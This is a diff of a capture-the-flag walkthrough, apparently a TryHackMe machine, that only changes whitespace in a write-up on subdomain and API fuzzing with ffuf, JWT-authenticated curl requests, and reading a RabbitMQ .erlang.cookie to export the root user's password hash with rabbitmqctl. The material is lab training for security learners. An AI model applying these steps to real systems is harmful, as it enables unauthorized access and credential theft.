@@ -7,11 +7,11 @@
 ---
 
 
-| PORT  | SERVICE |
+| PORT | SERVICE |
 | :---- | :------ |
-| 22    | ssh     |
-| 80    | http    |
-| 4369  | epmd    |
+| 22 | ssh |
+| 80 | http |
+| 4369 | epmd |
 | 25672 | unknown |
 
 We got 4 open ports, here's the Nmap scan:
@@ -42,7 +42,7 @@ Now, we need to add `storage.cloudsite.thm` to `/etc/hosts`, in this part, it wo
 ```
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cloudsite.thm/ -H "Host:FUZZ.cloudsite.thm" -fc 302 -ic -c -t 200
 
-storage                 [Status: 200, Size: 9039, Words: 3183, Lines: 263, Duration: 162ms
+storage [Status: 200, Size: 9039, Words: 3183, Lines: 263, Duration: 162ms
 ```
 
 We didn't miss anything, let's add it and continue:
@@ -78,10 +78,10 @@ But, we gained some knowledge about the behavior of the app, it makes a call to 
 ```bash
 ffuf -u 'http://storage.cloudsite.thm/api/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -mc all -t 100 -ic -c -fc 404 -t 200
 
-docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 267ms]
-login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 278ms]
-uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 322ms]
-register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 335ms]
+docs [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 267ms]
+login [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 278ms]
+uploads [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 322ms]
+register [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 335ms]
 ```
 
 We found three more endpoints:
@@ -103,7 +103,7 @@ Now, knowing these endpoints we can work with the API a bit better, the `registe
 curl -s -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc0MDYwMTA0MCwiZXhwIjoxNzQwNjA0NjQwfQ.gzrmvd6bhydOUlFKXrcQyVMuds2dSmt-sWvjUdDih_w' 'http://storage.cloudsite.thm/api/uploads' | jq
 
 {
-  "message": "Your subscription is inactive. You cannot use our services."
+ "message": "Your subscription is inactive. You cannot use our services."
 }
 ```
 
@@ -114,7 +114,7 @@ So, with our current token, we can not access the `uploads` endpoint, let's chec
 curl -s -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc0MDYwMTA0MCwiZXhwIjoxNzQwNjA0NjQwfQ.gzrmvd6bhydOUlFKXrcQyVMuds2dSmt-sWvjUdDih_w' 'http://storage.cloudsite.thm/api/docs' | jq
 
 {
-  "message": "Access denied"
+ "message": "Access denied"
 }
 ```
 
@@ -275,7 +275,7 @@ If we check `/var/lib`, we can find this:
 
 
 ```
-drwxr-xr-x  5 rabbitmq  rabbitmq  4096 Sep 12 00:32 rabbitmq
+drwxr-xr-x 5 rabbitmq rabbitmq 4096 Sep 12 00:32 rabbitmq
 ```
 
 We find a `rabbitmq` directory, let's check the contents:
@@ -283,14 +283,14 @@ We find a `rabbitmq` directory, let's check the contents:
 ```
 azrael@forge:~$ ls -la /var/lib/rabbitmq
 total 896
-drwxr-xr-x  5 rabbitmq rabbitmq   4096 Sep 12 00:32 .
-drwxr-xr-x 45 root     root       4096 Sep 20 19:11 ..
-drwxr-x---  3 rabbitmq rabbitmq   4096 Aug 15  2024 config
--r-----r--  1 rabbitmq rabbitmq     16 Feb 26 20:53 .erlang.cookie
--rw-r-----  1 rabbitmq rabbitmq 889386 Feb 26 20:53 erl_crash.dump
-drwxr-x---  4 rabbitmq rabbitmq   4096 Feb 26 20:53 mnesia
--rw-r-----  1 rabbitmq rabbitmq      0 Sep 12 00:33 nc
-drwxr-x---  2 rabbitmq rabbitmq   4096 Jul 18  2024 schema
+drwxr-xr-x 5 rabbitmq rabbitmq 4096 Sep 12 00:32 .
+drwxr-xr-x 45 root root 4096 Sep 20 19:11 ..
+drwxr-x--- 3 rabbitmq rabbitmq 4096 Aug 15 2024 config
+-r-----r-- 1 rabbitmq rabbitmq 16 Feb 26 20:53 .erlang.cookie
+-rw-r----- 1 rabbitmq rabbitmq 889386 Feb 26 20:53 erl_crash.dump
+drwxr-x--- 4 rabbitmq rabbitmq 4096 Feb 26 20:53 mnesia
+-rw-r----- 1 rabbitmq rabbitmq 0 Sep 12 00:33 nc
+drwxr-x--- 2 rabbitmq rabbitmq 4096 Jul 18 2024 schema
 ```
 
 We found a `.erlang.cookie` file, let's read it:
@@ -369,13 +369,13 @@ sudo rabbitmqctl --erlang-cookie 'R2z1G0FXf6Rk2H2w' --node rabbit@forge export_d
 
 cat /tmp/data.json | jq '.users[] | select(.name == "root")'
 {
-  "hashing_algorithm": "rabbit_password_hashing_sha256",
-  "limits": {},
-  "name": "root",
-  "password_hash": "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
-  "tags": [
-    "administrator"
-  ]
+ "hashing_algorithm": "rabbit_password_hashing_sha256",
+ "limits": {},
+ "name": "root",
+ "password_hash": "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
+ "tags": [
+ "administrator"
+ ]
 }
 ```
 
